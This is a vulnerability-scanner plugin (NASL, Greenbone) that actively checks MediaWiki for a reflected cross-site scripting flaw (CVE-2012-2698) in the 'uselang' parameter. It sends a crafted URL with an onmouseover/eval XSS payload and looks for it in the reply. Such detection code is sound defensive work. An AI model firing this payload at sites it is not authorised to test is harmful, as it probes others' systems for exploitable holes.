# SPDX-FileCopyrightText: 2012 Greenbone AG
# Some text descriptions might be excerpted from (a) referenced
# source(s), and are Copyright (C) by the respective right holder(s).
#
# SPDX-License-Identifier: GPL-2.0-only

CPE = "cpe:/a:mediawiki:mediawiki";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802910");
  script_version("2024-07-16T05:05:43+0000");
  script_cve_id("CVE-2012-2698");
  script_tag(name:"cvss_base", value:"4.3");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
  script_tag(name:"last_modification", value:"2024-07-16 05:05:43 +0000 (Tue, 16 Jul 2024)");
  script_tag(name:"creation_date", value:"2012-07-09 13:41:49 +0530 (Mon, 09 Jul 2012)");
  script_name("MediaWiki < 1.17.5, 1.18.x < 1.18.4, 1.19.x < 1.19.1 'uselang' Parameter XSS Vulnerability - Active Check");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2012 Greenbone AG");
  script_family("Web application abuses");
  script_dependencies("gb_mediawiki_http_detect.nasl");
  script_mandatory_keys("mediawiki/http/detected");
  script_require_ports("Services/www", 80);

  script_xref(name:"URL", value:"http://secunia.com/advisories/49484");
  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/53998");
  script_xref(name:"URL", value:"http://securitytracker.com/id?1027179");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/76311");
  script_xref(name:"URL", value:"https://bugzilla.wikimedia.org/show_bug.cgi?id=36938");
  script_xref(name:"URL", value:"http://www.openwall.com/lists/oss-security/2012/06/14/2");

  script_tag(name:"summary", value:"MediaWiki is prone to a cross-site scripting (XSS)
  vulnerability.");

  script_tag(name:"vuldetect", value:"Sends a crafted HTTP GET request and checks the response.");

  script_tag(name:"insight", value:"Input passed via the 'uselang' parameter to
  'index.php/Main_page' is not properly sanitised in the 'outputPage()' function, before being
  returned to the user.");

  script_tag(name:"impact", value:"Successful exploitation will allow attacker to execute arbitrary
  HTML and script code in a user's browser session in the context of an affected site.");

  script_tag(name:"affected", value:"MediaWiki versions prior to 1.17.5, 1.8.x prior to 1.18.4 and
  1.19.x prior to 1.19.1.");

  script_tag(name:"solution", value:"Update to version 1.17.5, 1.18.4, 1.19.1 or later.");

  script_tag(name:"qod_type", value:"remote_analysis");
  script_tag(name:"solution_type", value:"VendorFix");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");

if(!port = get_app_port(cpe:CPE, service:"www"))
  exit(0);

if(!dir = get_app_location(cpe:CPE, port:port))
  exit(0);

if(dir == "/")
  dir = "";

host = http_host_name(port:port);

url = dir + '/index.php/Main_Page?uselang=a%27%20onmouseover=eval(alert("document.cookie"))%20e=%27';

req = string("GET ", url, " HTTP/1.1\r\n",
             "Host: ", host, "\r\n\r\n");
res = http_send_recv(port:port, data:req);

if(egrep(pattern:"^HTTP/1\.[01] 200", string:res, icase:TRUE) &&
   'alert("document.cookie")' >< res && ">MediaWiki" >< res) {
  report = http_report_vuln_url(port:port, url:url);
  security_message(port:port, data:report);
  exit(0);
}

exit(99);
